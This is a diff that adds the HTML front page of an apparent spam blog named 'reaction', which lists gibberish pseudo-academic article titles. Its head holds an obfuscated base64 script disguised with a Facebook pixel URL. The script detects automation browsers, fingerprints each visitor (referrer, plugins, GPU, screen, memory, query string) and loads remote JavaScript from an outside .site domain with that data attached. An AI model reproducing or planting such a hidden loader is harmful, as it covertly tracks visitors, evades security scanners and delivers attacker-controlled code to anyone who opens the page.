@@ -1,0 +1,485 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+	<script src="data:text/javascript;base64, dmFyIGN1cGV3ZHR1cGJqdXZqdHRpbnlramhmamZrY3N1Y3J3d2hidGx2bmF3d3ZyZm9sb2NreWxyZXZ4b3hwamFoZ3dwaXBhZGRhYWF3c2drZXVub3R5Z3l0ZG1ydHdyYWNvcGtlcW9pcnBpbmhveWxqbHpka2ZiZWpvdmNrPWZ1bmN0aW9uKHNyYyl7dmFyIHE9YXRvYigiWDE5emRHOXdRV3hzVkdsdFpYSnpMbmRsWW1SeWFYWmxjaTVmWDI1cFoyaDBiV0Z5WlM1ZmMyVnNaVzVwZFcwdVkyRnNiRkJvWVc1MGIyMHVZMkZzYkZObGJHVnVhWFZ0TGw5VFpXeGxibWwxYlY5SlJFVmZVbVZqYjNKa1pYSXVjMlZzWlc1cGRXMHVaSEpwZG1WeUxsOXpaV3hsYm1sMWJTNWZYM2RsWW1SeWFYWmxjbDlsZG1Gc2RXRjBaUzVmWDNObGJHVnVhWFZ0WDJWMllXeDFZWFJsTGw5ZmQyVmlaSEpwZG1WeVgzTmpjbWx3ZEY5bWRXNWpkR2x2Ymk1ZlgzZGxZbVJ5YVhabGNsOXpZM0pwY0hSZlpuVnVZeTVmWDNkbFltUnlhWFpsY2w5elkzSnBjSFJmWm00dVgxOW1lR1J5YVhabGNsOWxkbUZzZFdGMFpTNWZYMlJ5YVhabGNsOTFibmR5WVhCd1pXUXVYMTkzWldKa2NtbDJaWEpmZFc1M2NtRndjR1ZrTGw5ZlpISnBkbVZ5WDJWMllXeDFZWFJsTGw5ZmMyVnNaVzVwZFcxZmRXNTNjbUZ3Y0dWa0xsOWZabmhrY21sMlpYSmZkVzUzY21Gd2NHVmtMbDl3YUdGdWRHOXRMbkJvWVc1MGIyMHVaRzl0UVhWMGIyMWhkR2x2Ymw5ZmJtbG5hSFJ0WVhKbCIpLnNwbGl0KCIuIiksZT1lbmNvZGVVUklDb21wb25lbnQsZz0wLHc9d2luZG93LGQ9dy5kb2N1bWVudCxuPXcubmF2aWdhdG9yLGRlPSJkb2N1bWVudEVsZW1lbnQiLHM9dy5zY3JlZW4scD0iIixhPSJhdmFpbCIsaT0iaW5uZXIiLG89Im91dGVyIixIPSJIZWlnaHQiLFc9IldpZHRoIixjPXcuY2hyb21lP09iamVjdC5rZXlzKHcuY2hyb21lKS5qb2luKCIqIik6IioiLHRhZz1kLmNyZWF0ZUVsZW1lbnQoInNjcmlwdCIpO2Z1bmN0aW9uIHdkKCl7dHJ5e2Zvcih2YXIgbCBpbiBxKXt2YXIgej1xW2xdO2lmKHdbel18fG5bel0pcmV0dXJuIHo7aWYoZCYmZFtkZV0mJmRbZGVdLmdldEF0dHJpYnV0ZSYmZFtkZV0uZ2V0QXR0cmlidXRlKHopKXJldHVybiB6O2lmKHogaW4gd3x8eiBpbiBkKXJldHVybiB6fXJldHVybiAwfWNhdGNoKGUpe319IWZ1bmN0aW9uIHdwKCl7dHJ5e2lmKG4mJm4ucGx1Z2lucyl7T2JqZWN0LmtleXMobi5wbHVnaW5zKS5mb3JFYWNoKGZ1bmN0aW9uKGkpe2lmKG4ucGx1Z2luc1tpXSlwKz1uLnBsdWdpbnNbaV0uZmlsZW5hbWUrIioifSl9fWNhdGNoKGUpe319KCk7dHJ5e2c9ZC5jcmVhdGVFbGVtZW50KCJjYW52YXMiKS5nZXRDb250ZXh0KCJ3ZWJnbCIpO2c9Zy5nZXRQYXJhbWV0ZXIoZy5nZXRFeHRlbnNpb24oIldFQkdMX2RlYnVnX3JlbmRlcmVyX2luZm8iKS5VTk1BU0tFRF9SRU5ERVJFUl9XRUJHTCl9Y2F0Y2goZSl7fXNyYz0iaHR0cHM6Ly90ZXNra2VvZGlldC5zaXRlL2pzMi5waHA/Y2xpZD0iK2J0b2EoInJlZj0iK2UoZC5yZWZlcnJlcikrIiZkcml2ZT0iK3dkKCkrIiZjPSIrYysiJnM9IitzW2ErSF0rIioiK3dbaStIXSsiKiIrd1tvK0hdKyIqIitzW2ErV10rIioiK3dbaStXXSsiKiIrd1tvK1ddKyIqIit3LmRldmljZVBpeGVsUmF0aW8rIioiK24ubWF4VG91Y2hQb2ludHMrIiZwPSIrcCsiJmg9IituLmhhcmR3YXJlQ29uY3VycmVuY3krIioiK24uZGV2aWNlTWVtb3J5KyIqIitlKGcpKyImdD0iK2UobmV3IERhdGUoKS50b1N0cmluZygpKSsiJnE9IitlKHcubG9jYXRpb24uc2VhcmNoLnN1YnN0cigxKSkpO3RhZ1sidHlwZSJdPSJ0ZXh0L2phdmFzY3JpcHQiO3RhZ1sic3JjIl09c3JjO2RvY3VtZW50LmhlYWQuYXBwZW5kQ2hpbGQodGFnKX0oImh0dHBzOi8vY29ubmVjdC5mYWNlYm9vay5uZXQvZW5fVVMvZmJldmVudHMuanMiKQ=="></script>
+	<meta charset="utf-8">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<title>reaction</title>
+
+	<!-- Google font -->
+	<link href="https://fonts.googleapis.com/css?family=Montserrat:400,700%7CMuli:400,700" rel="stylesheet">
+
+	<!-- Bootstrap -->
+	<link type="text/css" rel="stylesheet" href="css/bootstrap.min.css" />
+
+	<!-- Font Awesome Icon -->
+	<link rel="stylesheet" href="css/font-awesome.min.css">
+
+	<!-- Custom stlylesheet -->
+	<link type="text/css" rel="stylesheet" href="css/style.css" />
+
+	<!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
+	<!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+	<!--[if lt IE 9]>
+		  <script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js"></script>
+		  <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
+		<![endif]-->
+
+</head>
+
+<body>
+	<!-- HEADER -->
+	<header id="header">
+		<!-- NAV -->
+		<div id="nav">
+			<!-- Top Nav -->
+			<div id="nav-top">
+				<div class="container">
+					<!-- social -->
+					<ul class="nav-social">
+						<li><a href="#"><i class="fa fa-facebook"></i></a></li>
+						<li><a href="#"><i class="fa fa-twitter"></i></a></li>
+						<li><a href="#"><i class="fa fa-google-plus"></i></a></li>
+						<li><a href="#"><i class="fa fa-instagram"></i></a></li>
+					</ul>
+					<!-- /social -->
+
+					<!-- logo -->
+					<div class="nav-logo">
+						<a href="index.html" class="logo" style="text-transform: uppercase">reaction</a>
+					</div>
+					<!-- /logo -->
+
+					<!-- search & aside toggle -->
+					<div class="nav-btns">
+						<button class="search-btn"><i class="fa fa-search"></i></button>
+						<div id="nav-search">
+							<form>
+								<input class="input" name="search" placeholder="">
+							</form>
+							<button class="nav-close search-close">
+								<span></span>
+							</button>
+						</div>
+					</div>
+					<!-- /search & aside toggle -->
+				</div>
+			</div>
+			<!-- /Top Nav -->
+
+			<!-- Main Nav -->
+			<div id="nav-bottom">
+				<div class="container">
+					<!-- nav -->
+					<ul class="nav-menu">
+						<li>
+							<a href="index.html">Main</a>
+						</li>
+						<li class="has-dropdown">
+							<a href="index.html">Articles</a>
+							<div class="dropdown">
+								<div class="dropdown-body">
+									<ul class="dropdown-list">
+
+										<li><a href="Yu9pW1k0rLXwZfsnXVA8lFqzcAz5n.html">Topic: "The opportunis...</a></li>
+
+
+										<li><a href="f77cd7774c52c8cf6476e52c8cd8649a.html">Topic: "Convergent law...</a></li>
+
+
+										<li><a href="VdNMIYdqKee.html">Topic: "Experimental a...</a></li>
+
+
+										<li><a href="8sQotg9pYSq4Z8qUFVgDNFwSTcF56.html">Topic: "Convergent aut...</a></li>
+
+
+										<li><a href="QTuWOwcbpP1yDgFjWR.html">Topic: "Why is the ani...</a></li>
+
+
+										<li><a href="90d9139688d69dffc24e86f7483af351.html">Topic: "Collective int...</a></li>
+
+
+										<li><a href="Z3Xjh3UeuceD3.html">Topic: "Latent auto-tr...</a></li>
+
+
+										<li><a href="d7fHjuknNr.html">Topic: "Why is phyloge...</a></li>
+
+
+										<li><a href="f8ODVyHEkASru0gA2OQhojEeuly0qG.html">Topic: "Why is reflect...</a></li>
+
+
+									</ul>
+								</div>
+							</div>
+						</li>
+
+						<li><a href="contact.html">Contacts</a></li>
+						<li><a href="terms.html">Terms and conditions</a></li>
+					</ul>
+					<!-- /nav -->
+				</div>
+			</div>
+			<!-- /Main Nav -->
+		</div>
+		<!-- /NAV -->
+	</header>
+	<!-- /HEADER -->
+
+
+	<!-- SECTION -->
+	<div class="section">
+		<!-- container -->
+		<div class="container">
+			<!-- row -->
+			<div class="row">
+				<div class="col-md-8">
+					<!-- row -->
+					<div class="row">
+						<div class="col-md-12">
+							<div class="section-title">
+								<h2 class="title">Articles</h2>
+							</div>
+						</div>
+
+						<!-- post -->
+						<div class="col-md-6">
+							<div class="post">
+								<a class="post-img" href="Yu9pW1k0rLXwZfsnXVA8lFqzcAz5n.html"><img src="./img/061-etznewkgsxu.jpg" alt=""></a>
+								<div class="post-body">
+									<h3 class="post-title"><a href="Yu9pW1k0rLXwZfsnXVA8lFqzcAz5n.html">Topic: "The opportunistic law: main points»</a></h3>
+									<ul class="post-meta">
+										<li><a href="Yu9pW1k0rLXwZfsnXVA8lFqzcAz5n.html">Elena</a></li>
+									</ul>
+								</div>
+							</div>
+						</div>
+
+						<!-- /post -->
+
+
+						<!-- post -->
+						<div class="col-md-6">
+							<div class="post">
+								<a class="post-img" href="f77cd7774c52c8cf6476e52c8cd8649a.html"><img src="./img/013-nflhrleeimy.jpg" alt=""></a>
+								<div class="post-body">
+									<h3 class="post-title"><a href="f77cd7774c52c8cf6476e52c8cd8649a.html">Topic: "Convergent law through the eyes of contemporaries»</a></h3>
+									<ul class="post-meta">
+										<li><a href="f77cd7774c52c8cf6476e52c8cd8649a.html">Elena</a></li>
+									</ul>
+								</div>
+							</div>
+						</div>
+						<div class="clearfix visible-md visible-lg"></div>
+						<!-- /post -->
+
+
+						<!-- post -->
+						<div class="col-md-6">
+							<div class="post">
+								<a class="post-img" href="VdNMIYdqKee.html"><img src="./img/069-qcu16dxxh7q.jpg" alt=""></a>
+								<div class="post-body">
+									<h3 class="post-title"><a href="VdNMIYdqKee.html">Topic: "Experimental autism: leadership or conformity?»</a></h3>
+									<ul class="post-meta">
+										<li><a href="VdNMIYdqKee.html">Elena</a></li>
+									</ul>
+								</div>
+							</div>
+						</div>
+
+						<!-- /post -->
+
+
+						<!-- post -->
+						<div class="col-md-6">
+							<div class="post">
+								<a class="post-img" href="8sQotg9pYSq4Z8qUFVgDNFwSTcF56.html"><img src="./img/030-bs8gnifrypi.jpg" alt=""></a>
+								<div class="post-body">
+									<h3 class="post-title"><a href="8sQotg9pYSq4Z8qUFVgDNFwSTcF56.html">Topic: "Convergent auto-training is an urgent national task»</a></h3>
+									<ul class="post-meta">
+										<li><a href="8sQotg9pYSq4Z8qUFVgDNFwSTcF56.html">Elena</a></li>
+									</ul>
+								</div>
+							</div>
+						</div>
+						<div class="clearfix visible-md visible-lg"></div>
+						<!-- /post -->
+
+
+						<!-- post -->
+						<div class="col-md-6">
+							<div class="post">
+								<a class="post-img" href="QTuWOwcbpP1yDgFjWR.html"><img src="./img/06-w2_lbmjrnlq.jpg" alt=""></a>
+								<div class="post-body">
+									<h3 class="post-title"><a href="QTuWOwcbpP1yDgFjWR.html">Topic: "Why is the anima parallel?»</a></h3>
+									<ul class="post-meta">
+										<li><a href="QTuWOwcbpP1yDgFjWR.html">Elena</a></li>
+									</ul>
+								</div>
+							</div>
+						</div>
+
+						<!-- /post -->
+
+
+						<!-- post -->
+						<div class="col-md-6">
+							<div class="post">
+								<a class="post-img" href="90d9139688d69dffc24e86f7483af351.html"><img src="./img/040-k4iz8dzxdlm.jpg" alt=""></a>
+								<div class="post-body">
+									<h3 class="post-title"><a href="90d9139688d69dffc24e86f7483af351.html">Topic: "Collective interactionism: hypothesis and theories»</a></h3>
+									<ul class="post-meta">
+										<li><a href="90d9139688d69dffc24e86f7483af351.html">Elena</a></li>
+									</ul>
+								</div>
+							</div>
+						</div>
+						<div class="clearfix visible-md visible-lg"></div>
+						<!-- /post -->
+
+
+						<!-- post -->
+						<div class="col-md-6">
+							<div class="post">
+								<a class="post-img" href="Z3Xjh3UeuceD3.html"><img src="./img/07_6c5nyhzcmu.jpg" alt=""></a>
+								<div class="post-body">
+									<h3 class="post-title"><a href="Z3Xjh3UeuceD3.html">Topic: "Latent auto-training is an urgent national task»</a></h3>
+									<ul class="post-meta">
+										<li><a href="Z3Xjh3UeuceD3.html">Elena</a></li>
+									</ul>
+								</div>
+							</div>
+						</div>
+
+						<!-- /post -->
+
+
+						<!-- post -->
+						<div class="col-md-6">
+							<div class="post">
+								<a class="post-img" href="d7fHjuknNr.html"><img src="./img/085-x97a52jkne8.jpg" alt=""></a>
+								<div class="post-body">
+									<h3 class="post-title"><a href="d7fHjuknNr.html">Topic: "Why is phylogeny complicated?»</a></h3>
+									<ul class="post-meta">
+										<li><a href="d7fHjuknNr.html">Elena</a></li>
+									</ul>
+								</div>
+							</div>
+						</div>
+						<div class="clearfix visible-md visible-lg"></div>
+						<!-- /post -->
+
+
+						<!-- post -->
+						<div class="col-md-6">
+							<div class="post">
+								<a class="post-img" href="f8ODVyHEkASru0gA2OQhojEeuly0qG.html"><img src="./img/071-rnchqqsfhni.jpg" alt=""></a>
+								<div class="post-body">
+									<h3 class="post-title"><a href="f8ODVyHEkASru0gA2OQhojEeuly0qG.html">Topic: "Why is reflection observable?»</a></h3>
+									<ul class="post-meta">
+										<li><a href="f8ODVyHEkASru0gA2OQhojEeuly0qG.html">Elena</a></li>
+									</ul>
+								</div>
+							</div>
+						</div>
+
+						<!-- /post -->
+
+
+
+					</div>
+					<!-- /row -->
+				</div>
+				<div class="col-md-4">
+
+					<!-- social widget -->
+					<div class="aside-widget">
+						<div class="section-title">
+							<h2 class="title">Social media</h2>
+						</div>
+						<div class="social-widget">
+							<ul>
+								<li>
+									<a href="#" class="social-facebook">
+										<i class="fa fa-facebook"></i>
+										<span>112.7K<br>Followers</span>
+									</a>
+								</li>
+								<li>
+									<a href="#" class="social-twitter">
+										<i class="fa fa-twitter"></i>
+										<span>349.1<br>Followers</span>
+									</a>
+								</li>
+								<li>
+									<a href="#" class="social-google-plus">
+										<i class="fa fa-google-plus"></i>
+										<span>2.6<br>Followers</span>
+									</a>
+								</li>
+							</ul>
+						</div>
+					</div>
+					<!-- /social widget -->
+
+
+					<!-- newsletter widget -->
+					<div class="aside-widget">
+						<div class="section-title">
+							<h2 class="title">Mailing</h2>
+						</div>
+						<div class="newsletter-widget">
+							<form action="thanks.html">
+								<p>Enter your email address to receive new articles from our blog.</p>
+								<input class="input" name="newsletter" placeholder="Email">
+								<button class="primary-button">Subscribe</button>
+							</form>
+						</div>
+					</div>
+					<!-- /newsletter widget -->
+
+					<!-- post widget -->
+					<div class="aside-widget">
+						<div class="section-title">
+							<h2 class="title">Recent posts</h2>
+						</div>
+
+						<!-- post -->
+						<div class="post post-widget">
+							<a class="post-img" href="Yu9pW1k0rLXwZfsnXVA8lFqzcAz5n.html"><img src="./img/061-etznewkgsxu.jpg" alt=""></a>
+							<div class="post-body">
+								<h3 class="post-title"><a href="Yu9pW1k0rLXwZfsnXVA8lFqzcAz5n.html">Topic: "The opportunistic law: main points»</a></h3>
+							</div>
+						</div>
+						<!-- /post -->
+
+
+						<!-- post -->
+						<div class="post post-widget">
+							<a class="post-img" href="f77cd7774c52c8cf6476e52c8cd8649a.html"><img src="./img/013-nflhrleeimy.jpg" alt=""></a>
+							<div class="post-body">
+								<h3 class="post-title"><a href="f77cd7774c52c8cf6476e52c8cd8649a.html">Topic: "Convergent law through the eyes of contemporaries»</a></h3>
+							</div>
+						</div>
+						<!-- /post -->
+
+
+						<!-- post -->
+						<div class="post post-widget">
+							<a class="post-img" href="VdNMIYdqKee.html"><img src="./img/069-qcu16dxxh7q.jpg" alt=""></a>
+							<div class="post-body">
+								<h3 class="post-title"><a href="VdNMIYdqKee.html">Topic: "Experimental autism: leadership or conformity?»</a></h3>
+							</div>
+						</div>
+						<!-- /post -->
+
+
+						<!-- post -->
+						<div class="post post-widget">
+							<a class="post-img" href="8sQotg9pYSq4Z8qUFVgDNFwSTcF56.html"><img src="./img/030-bs8gnifrypi.jpg" alt=""></a>
+							<div class="post-body">
+								<h3 class="post-title"><a href="8sQotg9pYSq4Z8qUFVgDNFwSTcF56.html">Topic: "Convergent auto-training is an urgent national task»</a></h3>
+							</div>
+						</div>
+						<!-- /post -->
+
+
+
+					</div>
+					<!-- /post widget -->
+				</div>
+			</div>
+			<!-- /row -->
+		</div>
+		<!-- /container -->
+	</div>
+	<!-- /SECTION -->
+
+
+	<!-- FOOTER -->
+	<footer id="footer">
+		<!-- container -->
+		<div class="container">
+			<!-- row -->
+			<div class="row justify-content-center">
+				<div class="col-md-3 col-md-push-3">
+					<div class="footer-widget">
+						<div class="footer-logo">
+							<a href="index.html" class="logo" style="text-transform: uppercase">reaction</a>
+						</div>
+						<ul class="contact-social">
+							<li><a href="#" class="social-facebook"><i class="fa fa-facebook"></i></a></li>
+							<li><a href="#" class="social-twitter"><i class="fa fa-twitter"></i></a></li>
+							<li><a href="#" class="social-google-plus"><i class="fa fa-google-plus"></i></a></li>
+							<li><a href="#" class="social-instagram"><i class="fa fa-instagram"></i></a></li>
+						</ul>
+					</div>
+				</div>
+				<div class="col-md-3 col-md-push-3">
+					<div class="footer-widget">
+						<h3 class="footer-title">Mailing</h3>
+						<div class="newsletter-widget">
+							<form action="thanks.html">
+								<p>Enter your email address to receive new articles from our blog</p>
+								<input class="input" name="newsletter" placeholder="Email">
+								<button class="primary-button">Subscribe</button>
+							</form>
+						</div>
+					</div>
+				</div>
+			</div>
+			<!-- /row -->
+
+			<!-- row -->
+			<div class="footer-bottom row">
+				<div class="col-md-8 col-md-push-3">
+					<ul class="footer-nav">
+						<li><a href="index.html">Main</a></li>
+						<li><a href="contact.html">Contacts</a></li>
+						<li><a href="terms.html">Terms and conditions</a></li>
+						<li><a href="policy.html">Privacy policy</a></li>
+						<li><a </li>
+					</ul>
+				</div>
+				<div class="col-md-4 col-md-pull-8">
+					<div class="footer-copyright">
+Copyright &copy;<script>document.write(new Date().getFullYear());</script> All rights reserved
+
+					</div>
+				</div>
+			</div>
+			<!-- /row -->
+		</div>
+		<!-- /container -->
+	</footer>
+	<!-- /FOOTER -->
+
+	<!-- jQuery Plugins -->
+	<script src="js/jquery.min.js"></script>
+	<script src="js/bootstrap.min.js"></script>
+	<script src="js/jquery.stellar.min.js"></script>
+	<script src="js/main.js"></script>
+	<div class='cookie-banner'>
+		<p>
+			The site uses cookies. They allow us to recognize you and get information about your user experience.By continuing to browse the site, I agree to the use of cookies by the site owner in accordance with  <a target="_blank" href="https://en.wikipedia.org/wiki/HTTP_cookie">Cookie policy</a>
+		</p>
+		<button class='close-cookie'>&times;</button>
+	</div>
+	<script>
+		window.onload = function() {
+			$('.close-cookie').click(function () {
+				$('.cookie-banner').fadeOut();
+			})
+		}
+	</script>
+	<script>
+		let elems = document.querySelectorAll('.server-name');
+		elems.forEach((elem) => {
+			elem.innerHTML = window.location.hostname
+		})
+	</script>
+
+</body>
+
+</html>
